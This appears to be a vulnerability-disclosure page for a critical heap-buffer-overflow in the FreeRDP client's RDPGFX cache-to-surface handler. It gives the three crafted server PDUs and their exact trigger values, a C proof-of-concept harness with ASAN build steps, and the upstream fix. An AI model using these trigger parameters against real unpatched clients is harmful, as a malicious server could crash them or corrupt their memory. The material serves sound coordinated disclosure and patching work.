@@ -1,0 +1,383 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>ANT-2026-RXYVE4DZ · freerdp/freerdp</title>
+<link rel="icon" type="image/x-icon" href="/anthropic-serve/favicon.ico">
+<script>(function(){try{var t=localStorage.getItem("cvd_theme");if(t==="light"||t==="dark")document.documentElement.setAttribute("data-theme",t);}catch(e){}})();</script>
+<link rel="stylesheet" href="../assets/site.css">
+<link rel="stylesheet" href="../assets/ledger.css">
+</head>
+<body>
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-MT0111843S"></script><script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag() { dataLayer.push(arguments); }
+  gtag('js', new Date());
+  gtag('config', 'G-MT0111843S');
+</script>
+<main>
+<h1>ANT-2026-RXYVE4DZ · freerdp/freerdp</h1>
+<nav class="site-nav muted">
+<a href="../index.html">Overview</a>  ·
+<a href="../ledger/index.html">Ledger</a>  ·
+<a href="../archive/index.html">Archive</a>  ·
+<a href="../about/index.html">About</a>  <span class="theme-toggle">
+    <button type="button" data-set-theme="light">Light</button>
+    <button type="button" data-set-theme="dark">Dark</button>
+    <button type="button" data-set-theme="system">System</button>
+  </span>
+</nav>
+<h2>
+  oob-write
+  <span class="sev-badge sev-critical">critical</span>
+</h2>
+
+<p class="id-badges">
+  <a class="id-badge" href="https://nvd.nist.gov/vuln/detail/CVE-2026-40033">CVE-2026-40033</a>
+  <a class="id-badge" href="https://nvd.nist.gov/vuln/detail/CVE-2026-44421">CVE-2026-44421</a>
+  <a class="id-badge" href="https://github.com/FreeRDP/FreeRDP/security/advisories/GHSA-mpxh-8fq3-x8mh">GHSA-mpxh-8fq3-x8mh</a>
+  <a class="id-badge" href="https://github.com/FreeRDP/FreeRDP/security/advisories/GHSA-mvpx-xj7r-3p3r">GHSA-mvpx-xj7r-3p3r</a>
+  <a class="id-badge" href="https://github.com/FreeRDP/FreeRDP/security/advisories/GHSA-p6r2-4hgm-m6ff">GHSA-p6r2-4hgm-m6ff</a>
+</p>
+
+<p class="sev-compare">
+  <span class="sev-compare-label">Severity</span>
+  <span class="sev-compare-item">Claude <span class="sev-chip sev-critical">critical</span></span>
+  <span class="sev-compare-sep">·</span>
+  <span class="sev-compare-item">Security research firm <span class="sev-chip sev-critical">critical (revised; sealed as high)</span></span>
+  <span class="sev-compare-sep">·</span>
+  <span class="sev-compare-item">Maintainer <span class="sev-chip sev-unknown">-</span></span>
+</p>
+
+<p class="attribution">Discovered by
+<span class="model-chip">Claude Mythos Preview</span></p>
+
+
+<div class="marker">REPORT</div>
+<p class="section-intro">Anthropic's analysis, sealed at approval. Disclosure to the maintainer was performed by Trail of Bits.</p>
+<div class="report-body" tabindex="0"><h1>ANT-2026-RXYVE4DZ: Heap-buffer-overflow in sanitizer_common_interceptors.inc:827</h1>
+<p>In FreeRDP's RDPGFX handler, gdi_CacheToSurface (libfreerdp/gdi/gfx.c:1552) validates a destination rectangle that has been clamped to UINT16_MAX, but then passes the original unclamped cacheEntry-&gt;width/height to freerdp_image_copy_no_overlap. A malicious RDP server can send a CreateSurface (65535x1), a SurfaceToCache producing a 65535-wide cache entry, and a CacheToSurface with destPt={65534,15}; the clamped rect passes validation while the real copy writes ~262,140 bytes past a ~4 MiB heap buffer allocated in gdi_CreateSurface. The attacker controls the surface dimensions, cache-entry size, and destination point via standard RDPGFX PDUs. The result is a large attacker-influenced heap write on the client, reproduced 3/3 under ASAN.</p>
+<h2>Target</h2>
+<p><strong>Project:</strong> freerdp/freerdp<br>
+<strong>Location:</strong> <code>sanitizer_common_interceptors.inc:827</code>  </p>
+<h2>Technical Details</h2>
+<p>ASAN: heap-buffer-overflow WRITE of size 262140, 0 bytes to the right of a 4194344-byte region allocated by winpr_aligned_malloc in gdi_CreateSurface (gfx.c:1200). The bounds check clamps (destPt.x + cacheEntry-&gt;width) to UINT16_MAX before validating against the surface, so a destPt.x of 65534 plus a width of 65535 appears in-bounds; the subsequent freerdp_image_copy_no_overlap uses the unclamped width and writes far past the end of the surface buffer.</p>
+<p><strong>Crash trace:</strong></p>
+<pre tabindex="0"><code>The PoC is a well-crafted C program that demonstrates a heap-buffer-overflow WRITE vulnerability in FreeRDP's `gdi_CacheToSurface` function (`libfreerdp/gdi/gfx.c:1552`).
+
+**Root cause:** `gdi_CacheToSurface` validates a *clamped* bounding rectangle (clamped to UINT16_MAX) but passes the *original unclamped* `cacheEntry-&gt;width/height` to `freerdp_image_copy_no_overlap`. When `destPt-&gt;x` is large (65534) and `cacheEntry-&gt;width` is also large (65535), the validation passes because the clamped rect fits within the surface, but the actual copy writes far beyond the allocated buffer.
+
+**Attack chain:** Three RDPGFX PDUs that can be sent by a malicious server to a client:
+1. CreateSurface (width=65535, height=1) — allocates a 4,194,304-byte buffer
+2. SurfaceToCache (rect={0,0,65535,1}) — creates a cache entry with width=65535
+3. CacheToSurface (destPt={65534,15}) — triggers the overflow: writes 262,140 bytes starting at offset 4,194,296, overflowing the buffer by ~262,132 bytes
+
+**Reproduction results (3/3 runs):**
+- All 3 runs: ASAN `heap-buffer-overflow` WRITE of size 262140
+- All 3 runs: exit code 1 (ASAN abort)
+- Stack trace consistently shows: `main` -&gt; `gdi_CacheToSurface` (gfx.c:1552) -&gt; `freerdp_image_copy_no_overlap` (color.c:1908) -&gt; `generic_image_copy_no_overlap_memcpy` (prim_copy.c:285) -&gt; `__interceptor_memcpy`
+- Buffer allocated in `gdi_CreateSurface` (gfx.c:1200) via `winpr_aligned_malloc`
+- &quot;0 bytes to the right of 4194344-byte region&quot; confirms overflow at exact buffer boundary
+</code></pre>
+<h2>Reproduction</h2>
+<ol>
+<li>Send RDPGFX CreateSurface with width=65535, height=1 (allocates ~4,194,304-byte surface buffer)</li>
+<li>Send RDPGFX SurfaceToCache with rect {0,0,65535,1} to create a cache entry of width=65535</li>
+<li>Send RDPGFX CacheToSurface with destPt={65534,15}; clamped rect passes validation but memcpy writes 262,140 bytes starting at offset ~4,194,296, overflowing by ~262,132 bytes</li>
+</ol>
+<p><em>[No reproducer or sanitizer output attached — request from security-cvd@anthropic.com if needed.]</em></p>
+<h2>Acknowledgement</h2>
+<p>This vulnerability was discovered by Claude, Anthropic's AI assistant, and triaged by the Anthropic security team in collaboration with Anthropic Research. Please direct questions to security-cvd@anthropic.com and reference ANT-2026-RXYVE4DZ.</p>
+<hr>
+<p><strong>Reference:</strong> ANT-2026-RXYVE4DZ<br>
+<strong>Anthropic CVD Policy:</strong> https://www.anthropic.com/coordinated-vulnerability-disclosure</p></div>
+
+<div class="marker">SECURITY RESEARCH FIRM ANALYSIS</div>
+<p class="section-intro">Triage and disclosure were performed by Trail of Bits. The writeup below is the document the firm sent to the maintainer. The severity shown is the firm's current assessment; the report was sealed with the firm's earlier assessment of high.</p>
+<dl class="vendor-analysis">
+<dt>Verdict</dt><dd><span class="verdict-chip verdict-tp">true positive</span></dd><dt>Severity</dt><dd class="sev-critical">critical (revised; sealed as high)</dd></dl>
+<div class="report-body" tabindex="0"><h3>Summary</h3>
+<p>A malicious RDP server can trigger a heap-buffer-overflow write in the FreeRDP client by sending crafted RDPGFX PDUs. The bug is in <code>gdi_CacheToSurface</code>: it validates a destination rectangle that is clamped to <code>UINT16_MAX</code>, but then performs the copy using the original <code>cacheEntry-&gt;width/height</code>. This can cause a large out-of-bounds heap write and may lead to client crashes or code execution.</p>
+<p>This bug is reachable from a malicious RDP server, but only when the client has RDPGFX enabled. The C PoC is just a local harness that calls the exact same FreeRDP handlers that are normally triggered by server-sent RDPGFX PDUs.</p>
+<h3>Details</h3>
+<p>In FreeRDP commit <code>23b36cd00ebf0ccd97750fcdbc9aa2f362352da7</code>:</p>
+<ol>
+<li>
+<p><code>gdi_CreateSurface</code> aligns the surface dimensions up to 16. <code>surface-&gt;width = gfx_align_scanline(createSurface-&gt;width, 16)</code> and <code>surface-&gt;height = gfx_align_scanline(createSurface-&gt;height, 16)</code>. So a server-supplied <code>CreateSurface(width=65535,height=1)</code> results in an allocated surface of <code>65536x16</code> pixels.</p>
+</li>
+<li>
+<p><code>gdi_CacheToSurface</code> builds a <code>RECTANGLE_16</code> using clamped right/bottom edges. Because <code>rect.right</code> is clamped to <code>UINT16_MAX</code>, the rectangle validation can succeed even when the <em>actual</em> copy width/height would extend past the surface.</p>
+</li>
+</ol>
+<p>Concrete crash parameters (<strong>attacker-controlled</strong> via standard RDPGFX messages): create a surface with <code>createSurface-&gt;width=65535</code>, <code>createSurface-&gt;height=1</code>, create a cache entry with <code>cacheEntry-&gt;width=65535</code>, <code>cacheEntry-&gt;height=1</code>, send <code>CacheToSurface</code> with <code>destPt={ x=65534, y=15 }</code>.</p>
+<h3>PoC</h3>
+<p>This reproducer does not require a live RDP server. It simulates the exact bounds check used by <code>gdi_CacheToSurface</code> and then calls <code>freerdp_image_copy_no_overlap</code> with the same parameters <code>gdi_CacheToSurface</code> would pass.</p>
+<p>Tested against FreeRDP commit <code>23b36cd00ebf0ccd97750fcdbc9aa2f362352da7</code> on Linux.</p>
+<p>1) Build FreeRDP with ASAN/UBSAN (disable optional dependencies that are not needed for this PoC):</p>
+<pre tabindex="0"><code class="language-bash">git clone https://github.com/FreeRDP/FreeRDP.git /tmp/freerdp-src
+cd /tmp/freerdp-src
+git checkout 23b36cd00ebf0ccd97750fcdbc9aa2f362352da7
+
+mkdir build-asan &amp;&amp; cd build-asan
+cmake .. \
+  -DCMAKE_BUILD_TYPE=Debug \
+  -DCMAKE_C_FLAGS='-g -O1 -fno-omit-frame-pointer -fsanitize=address,undefined' \
+  -DCMAKE_EXE_LINKER_FLAGS='-fsanitize=address,undefined' \
+  -DCMAKE_SHARED_LINKER_FLAGS='-fsanitize=address,undefined' \
+  -DWITH_FFMPEG=OFF -DWITH_SWSCALE=OFF -DWITH_FUSE=OFF \
+  -DWITH_SERVER=OFF -DWITH_SAMPLE=OFF -DWITH_SHADOW=OFF -DWITH_PROXY=OFF \
+  -DWITH_CLIENT_SDL=OFF -DWITH_WAYLAND=OFF -DCHANNEL_URBDRC=OFF -DBUILD_TESTING=OFF
+make -j&quot;$(nproc)&quot;
+</code></pre>
+<p>2) Save this as <code>poc_505.c</code> (for example in <code>/tmp/poc_505.c</code>):</p>
+<pre tabindex="0"><code class="language-c">#include &lt;freerdp/types.h&gt;
+#include &lt;freerdp/codec/color.h&gt;
+
+#include &lt;stdint.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+
+static uint32_t gfx_align_scanline(uint32_t widthInBytes, uint32_t alignment)
+{
+        const uint32_t align = alignment;
+        const uint32_t pad = align - (widthInBytes % alignment);
+        uint32_t scanline = widthInBytes;
+
+        if (align != pad)
+                scanline += pad;
+
+        return scanline;
+}
+
+static BOOL is_rect_valid(const RECTANGLE_16* rect, size_t width, size_t height)
+{
+        if (!rect)
+                return FALSE;
+        if ((rect-&gt;left &gt; rect-&gt;right) || (rect-&gt;right &gt; width))
+                return FALSE;
+        if ((rect-&gt;top &gt; rect-&gt;bottom) || (rect-&gt;bottom &gt; height))
+                return FALSE;
+        return TRUE;
+}
+
+int main(void)
+{
+        const uint16_t destX = 65534;
+        const uint16_t destY = 15;
+        const uint32_t cacheWidth = 65535;
+        const uint32_t cacheHeight = 1;
+
+        const uint32_t surfaceWidth = gfx_align_scanline(65535, 16); /* 65536 */
+        const uint32_t surfaceHeight = gfx_align_scanline(1, 16);    /* 16 */
+        const uint32_t surfaceScanline = gfx_align_scanline(surfaceWidth * 4U, 16);
+        const size_t surfaceSize = (size_t)surfaceScanline * surfaceHeight;
+
+        BYTE* surfaceData = (BYTE*)malloc(surfaceSize);
+        if (!surfaceData)
+                return 1;
+        memset(surfaceData, 0x41, surfaceSize);
+
+        const uint32_t cacheScanline = gfx_align_scanline(cacheWidth * 4U, 16);
+        const size_t cacheSize = (size_t)cacheScanline * cacheHeight;
+
+        BYTE* cacheData = (BYTE*)malloc(cacheSize);
+        if (!cacheData)
+        {
+                free(surfaceData);
+                return 1;
+        }
+        memset(cacheData, 0x42, cacheSize);
+
+        const RECTANGLE_16 rect = { destX, destY,
+                (UINT16)MIN(UINT16_MAX, (uint32_t)destX + cacheWidth),
+                (UINT16)MIN(UINT16_MAX, (uint32_t)destY + cacheHeight) };
+
+        if (!is_rect_valid(&amp;rect, surfaceWidth, surfaceHeight))
+        {
+                fprintf(stderr, &quot;rect unexpectedly invalid\n&quot;);
+                free(cacheData);
+                free(surfaceData);
+                return 1;
+        }
+
+        /* This mirrors the vulnerable call site in gdi_CacheToSurface. */
+        freerdp_image_copy_no_overlap(surfaceData, PIXEL_FORMAT_BGRA32, surfaceScanline, destX, destY,
+                                     cacheWidth, cacheHeight, cacheData, PIXEL_FORMAT_BGRA32,
+                                     cacheScanline, 0, 0, NULL, FREERDP_FLIP_NONE);
+
+        free(cacheData);
+        free(surfaceData);
+        return 0;
+}
+</code></pre>
+<p>3) Compile and run:</p>
+<pre tabindex="0"><code class="language-bash">cd /tmp/freerdp-src/build-asan
+
+gcc -g -O1 -fsanitize=address,undefined \
+  -I../include -I./include -I../winpr/include -I./winpr/include \
+  /tmp/poc_505.c \
+  -L./libfreerdp -L./winpr/libwinpr -lfreerdp3 -lwinpr3 \
+  -Wl,-rpath,./libfreerdp:./winpr/libwinpr -o /tmp/poc_505
+
+ASAN_OPTIONS='detect_leaks=0:abort_on_error=1:halt_on_error=1:print_stacktrace=1' \
+  LD_LIBRARY_PATH=./libfreerdp:./winpr/libwinpr \
+  /tmp/poc_505
+</code></pre>
+<p>Expected result: ASAN reports a <code>heap-buffer-overflow</code> with <code>WRITE of size 262140</code>.</p>
+<h3>Suggested fix</h3>
+<p>Add bounds checks based on the real (unclamped) copy dimensions before calling <code>freerdp_image_copy_no_overlap</code>.</p>
+<pre tabindex="0"><code class="language-diff">diff --git a/libfreerdp/gdi/gfx.c b/libfreerdp/gdi/gfx.c
+index feec35967..aaad7b349 100644
+--- a/libfreerdp/gdi/gfx.c
++++ b/libfreerdp/gdi/gfx.c
+@@ -1659,6 +1659,11 @@ static UINT gdi_CacheToSurface(RdpgfxClientContext* context,
+                if (!is_rect_valid(&amp;rect, surface-&gt;width, surface-&gt;height))
+                        goto fail;
++
++               if ((UINT32)destPt-&gt;x + cacheEntry-&gt;width &gt; surface-&gt;width)
++                       goto fail;
++               if ((UINT32)destPt-&gt;y + cacheEntry-&gt;height &gt; surface-&gt;height)
++                       goto fail;
+
+                if (!freerdp_image_copy_no_overlap(surface-&gt;data, surface-&gt;format, surface-&gt;scanline,
+                                                   destPt-&gt;x, destPt-&gt;y, cacheEntry-&gt;width,
+                                                   cacheEntry-&gt;height, cacheEntry-&gt;data, cacheEntry-&gt;format,
+</code></pre>
+<h3>Impact</h3>
+<p>This is a heap-buffer-overflow write in the FreeRDP client and any user or application using FreeRDP (for example <code>xfreerdp</code>) connecting to an attacker-controlled RDP server that negotiates RDPGFX is impacted. 
+At minimum an attacker get remote crash (DoS) of the FreeRDP client (which is not a high severity in that context), but and potentially code execution in the context of the client process, because the attacker controls a large out-of-bounds heap write (size and content come from server-controlled cached pixel data). A server can control the exact fields that lead into <code>gdi_CacheToSurface</code>, and the bug is on the real server-&gt;client message path.</p>
+<p><strong>Background of that issue</strong>
+This bug was found as a part of an Anthropic research into the use of large language models for automated vulnerability discovery in open source software. Anthropic then engaged Trail of Bits to independently triage and validate those issues.</p></div>
+
+
+<div class="marker">UPSTREAM FIX</div>
+<p class="section-intro">The change that resolved this finding.</p>
+<div class="diff-block"><pre class="diff" tabindex="0"><code><span class="diff-h">diff --git a/libfreerdp/gdi/gfx.c b/libfreerdp/gdi/gfx.c</span>
+<span class="diff-h">index feec35967c90..6be9a3fb9596 100644</span>
+<span class="diff-h">--- a/libfreerdp/gdi/gfx.c</span>
+<span class="diff-h">+++ b/libfreerdp/gdi/gfx.c</span>
+<span class="diff-h">@@ -1659,10 +1659,12 @@ static UINT gdi_CacheToSurface(RdpgfxClientContext* context,</span>
+<span class="diff-c"> 		if (!is_rect_valid(&amp;rect, surface-&gt;width, surface-&gt;height))</span>
+<span class="diff-c"> 			goto fail;</span>
+<span class="diff-c"> </span>
+<span class="diff-a">+		const UINT32 w = rect.right - rect.left;</span>
+<span class="diff-a">+		const UINT32 h = rect.bottom - rect.top;</span>
+<span class="diff-c"> 		if (!freerdp_image_copy_no_overlap(surface-&gt;data, surface-&gt;format, surface-&gt;scanline,</span>
+<span class="diff-d">-		                                   destPt-&gt;x, destPt-&gt;y, cacheEntry-&gt;width,</span>
+<span class="diff-d">-		                                   cacheEntry-&gt;height, cacheEntry-&gt;data, cacheEntry-&gt;format,</span>
+<span class="diff-d">-		                                   cacheEntry-&gt;scanline, 0, 0, nullptr, FREERDP_FLIP_NONE))</span>
+<span class="diff-a">+		                                   destPt-&gt;x, destPt-&gt;y, w, h, cacheEntry-&gt;data,</span>
+<span class="diff-a">+		                                   cacheEntry-&gt;format, cacheEntry-&gt;scanline, 0, 0, nullptr,</span>
+<span class="diff-a">+		                                   FREERDP_FLIP_NONE))</span>
+<span class="diff-c"> 			goto fail;</span>
+<span class="diff-c"> </span>
+<span class="diff-c"> 		invalidRect = rect;</span>
+<span class="diff-h">diff --git a/server/proxy/pf_config.c b/server/proxy/pf_config.c</span>
+<span class="diff-h">index b3c09c148e63..413e38fb53e5 100644</span>
+<span class="diff-h">--- a/server/proxy/pf_config.c</span>
+<span class="diff-h">+++ b/server/proxy/pf_config.c</span>
+<span class="diff-h">@@ -286,7 +286,7 @@ static BOOL pf_config_load_server(wIniFile* ini, proxyConfig* config)</span>
+<span class="diff-c"> 			return FALSE;</span>
+<span class="diff-c"> 	}</span>
+<span class="diff-c"> </span>
+<span class="diff-d">-	if (!pf_config_get_uint16(ini, section_server, key_port, &amp;config-&gt;Port, TRUE))</span>
+<span class="diff-a">+	if (!pf_config_get_uint16(ini, section_server, key_port, &amp;config-&gt;Port, FALSE))</span>
+<span class="diff-c"> 		return FALSE;</span>
+<span class="diff-c"> </span>
+<span class="diff-c"> 	const char* sam = pf_config_get_str(ini, section_server, key_sam_file, FALSE);</span>
+<span class="diff-h">diff --git a/server/proxy/test/conf/test-no-host-port.conf b/server/proxy/test/conf/test-no-host-port.conf</span>
+<span class="diff-h">index 45ce972364e8..88c254760c22 100644</span>
+<span class="diff-h">--- a/server/proxy/test/conf/test-no-host-port.conf</span>
+<span class="diff-h">+++ b/server/proxy/test/conf/test-no-host-port.conf</span>
+<span class="diff-h">@@ -1,6 +1,4 @@</span>
+<span class="diff-c"> [Server]</span>
+<span class="diff-d">-Host=0.0.0.0</span>
+<span class="diff-d">-Port=3389</span>
+<span class="diff-c"> SamFile=optional/path/some/file.sam</span>
+<span class="diff-c"> </span>
+<span class="diff-c"> [Target]</span></code></pre></div>
+<p class="kicker"><a href="https://github.com/FreeRDP/FreeRDP/commit/d7508ebcd82842a691ae4941e5104d14240a89ae" rel="noopener noreferrer">https://github.com/FreeRDP/FreeRDP/commit/d7508ebcd82842a691ae4941e5104d14240a89ae</a></p>
+
+
+
+<div class="marker">TIMELINE</div>
+<p class="section-intro">Recorded dates, in order.</p>
+<div class="figure">
+  <ol class="timeline">
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-03-24</span>
+      <span class="timeline-label">Discovered or logged</span>
+    </li>
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-04-30</span>
+      <span class="timeline-label">Sent to maintainer</span>
+    </li>
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-04-30</span>
+      <span class="timeline-label">Maintainer acknowledged</span>
+    </li>
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-05-12</span>
+      <span class="timeline-label">Patch released</span>
+    </li>
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-05-20</span>
+      <span class="timeline-label">Publicly revealed</span>
+    </li>
+  </ol>
+</div>
+
+<div class="marker">PROVENANCE</div>
+<p class="kicker">SHA-3-512 hash:</p>
+<p class="hash full">0c44262d039d2d96e1bca18c6ba2921c2566dcd498a233f42d427dd2b208cf3b6ebd2e0cb0c30267ec4d9c5269de8379573ba271aeeda56757340fab7ff84161</p>
+<p class="kicker">Committed 2026-04-30 07:03 UTC</p>
+<p class="kicker">Revealed 2026-05-20 07:40 UTC</p>
+<p class="kicker">
+  <a download="ANT-2026-RXYVE4DZ-preimage.json"
+     href="data:application/json;charset=utf-8,%7B%22ant_id%22%3A%22ANT-2026-RXYVE4DZ%22%2C%22bug_class%22%3A%22Heap-buffer-overflow%22%2C%22claude_severity%22%3A%22critical%22%2C%22commit_sha%22%3Anull%2C%22created_at%22%3A%222026-03-24T20%3A44%3A05%2B00%3A00%22%2C%22description%22%3A%22In%20FreeRDP%27s%20RDPGFX%20handler%2C%20gdi_CacheToSurface%20%28libfreerdp/gdi/gfx.c%3A1552%29%20validates%20a%20destination%20rectangle%20that%20has%20been%20clamped%20to%20UINT16_MAX%2C%20but%20then%20passes%20the%20original%20unclamped%20cacheEntry-%3Ewidth/height%20to%20freerdp_image_copy_no_overlap.%20A%20malicious%20RDP%20server%20can%20send%20a%20CreateSurface%20%2865535x1%29%2C%20a%20SurfaceToCache%20producing%20a%2065535-wide%20cache%20entry%2C%20and%20a%20CacheToSurface%20with%20destPt%3D%7B65534%2C15%7D%3B%20the%20clamped%20rect%20passes%20validation%20while%20the%20real%20copy%20writes%20~262%2C140%20bytes%20past%20a%20~4%20MiB%20heap%20buffer%20allocated%20in%20gdi_CreateSurface.%20The%20attacker%20controls%20the%20surface%20dimensions%2C%20cache-entry%20size%2C%20and%20destination%20point%20via%20standard%20RDPGFX%20PDUs.%20The%20result%20is%20a%20large%20attacker-influenced%20heap%20write%20on%20the%20client%2C%20reproduced%203/3%20under%20ASAN.%22%2C%22discovered_at%22%3Anull%2C%22location%22%3A%22sanitizer_common_interceptors.inc%3A827%22%2C%22poc_sha256%22%3Anull%2C%22preimage_version%22%3A1%2C%22project%22%3A%22freerdp%22%2C%22reproduction%22%3A%5B%221.%20Send%20RDPGFX%20CreateSurface%20with%20width%3D65535%2C%20height%3D1%20%28allocates%20~4%2C194%2C304-byte%20surface%20buffer%29%22%2C%222.%20Send%20RDPGFX%20SurfaceToCache%20with%20rect%20%7B0%2C0%2C65535%2C1%7D%20to%20create%20a%20cache%20entry%20of%20width%3D65535%22%2C%223.%20Send%20RDPGFX%20CacheToSurface%20with%20destPt%3D%7B65534%2C15%7D%3B%20clamped%20rect%20passes%20validation%20but%20memcpy%20writes%20262%2C140%20bytes%20starting%20at%20offset%20~4%2C194%2C296%2C%20overflowing%20by%20~262%2C132%20bytes%22%5D%2C%22technical_details%22%3A%22ASAN%3A%20heap-buffer-overflow%20WRITE%20of%20size%20262140%2C%200%20bytes%20to%20the%20right%20of%20a%204194344-byte%20region%20allocated%20by%20winpr_aligned_malloc%20in%20gdi_CreateSurface%20%28gfx.c%3A1200%29.%20The%20bounds%20check%20clamps%20%28destPt.x%20%2B%20cacheEntry-%3Ewidth%29%20to%20UINT16_MAX%20before%20validating%20against%20the%20surface%2C%20so%20a%20destPt.x%20of%2065534%20plus%20a%20width%20of%2065535%20appears%20in-bounds%3B%20the%20subsequent%20freerdp_image_copy_no_overlap%20uses%20the%20unclamped%20width%20and%20writes%20far%20past%20the%20end%20of%20the%20surface%20buffer.%22%2C%22title%22%3A%22Heap-buffer-overflow%20in%20sanitizer_common_interceptors.inc%3A827%22%2C%22vendor_severity%22%3A%22high%22%7D">Verify (download preimage.json)</a>
+</p>
+<details class="preimage">
+  <summary>Show preimage JSON</summary>
+  <pre class="preimage-body">{
+  &#34;ant_id&#34;: &#34;ANT-2026-RXYVE4DZ&#34;,
+  &#34;bug_class&#34;: &#34;Heap-buffer-overflow&#34;,
+  &#34;claude_severity&#34;: &#34;critical&#34;,
+  &#34;commit_sha&#34;: null,
+  &#34;created_at&#34;: &#34;2026-03-24T20:44:05+00:00&#34;,
+  &#34;description&#34;: &#34;In FreeRDP&#39;s RDPGFX handler, gdi_CacheToSurface (libfreerdp/gdi/gfx.c:1552) validates a destination rectangle that has been clamped to UINT16_MAX, but then passes the original unclamped cacheEntry-&gt;width/height to freerdp_image_copy_no_overlap. A malicious RDP server can send a CreateSurface (65535x1), a SurfaceToCache producing a 65535-wide cache entry, and a CacheToSurface with destPt={65534,15}; the clamped rect passes validation while the real copy writes ~262,140 bytes past a ~4 MiB heap buffer allocated in gdi_CreateSurface. The attacker controls the surface dimensions, cache-entry size, and destination point via standard RDPGFX PDUs. The result is a large attacker-influenced heap write on the client, reproduced 3/3 under ASAN.&#34;,
+  &#34;discovered_at&#34;: null,
+  &#34;location&#34;: &#34;sanitizer_common_interceptors.inc:827&#34;,
+  &#34;poc_sha256&#34;: null,
+  &#34;preimage_version&#34;: 1,
+  &#34;project&#34;: &#34;freerdp&#34;,
+  &#34;reproduction&#34;: [
+    &#34;1. Send RDPGFX CreateSurface with width=65535, height=1 (allocates ~4,194,304-byte surface buffer)&#34;,
+    &#34;2. Send RDPGFX SurfaceToCache with rect {0,0,65535,1} to create a cache entry of width=65535&#34;,
+    &#34;3. Send RDPGFX CacheToSurface with destPt={65534,15}; clamped rect passes validation but memcpy writes 262,140 bytes starting at offset ~4,194,296, overflowing by ~262,132 bytes&#34;
+  ],
+  &#34;technical_details&#34;: &#34;ASAN: heap-buffer-overflow WRITE of size 262140, 0 bytes to the right of a 4194344-byte region allocated by winpr_aligned_malloc in gdi_CreateSurface (gfx.c:1200). The bounds check clamps (destPt.x + cacheEntry-&gt;width) to UINT16_MAX before validating against the surface, so a destPt.x of 65534 plus a width of 65535 appears in-bounds; the subsequent freerdp_image_copy_no_overlap uses the unclamped width and writes far past the end of the surface buffer.&#34;,
+  &#34;title&#34;: &#34;Heap-buffer-overflow in sanitizer_common_interceptors.inc:827&#34;,
+  &#34;vendor_severity&#34;: &#34;high&#34;
+}</pre>
+</details>
+</main>
+<footer>
+  <p>Anthropic Frontier Red Team</p>
+  <p>Snapshot generated at 2026-11-02 19:30 UTC</p>
+  <p>Dates and times are in UTC</p>
+  <p>Manifest hash <code>25d811e7b56632ef5bbb23eb…</code></p>
+  <p>Archived snapshots remain available at their dated paths so any figure can be verified against the page that was live on that date</p>
+  <p><a href="../data/payload.json">payload.json</a></p>
+</footer>
+<script src="../assets/figures.js" data-root="../"></script>
+<script src="../assets/ledger.js"></script>
+</body>
+</html>
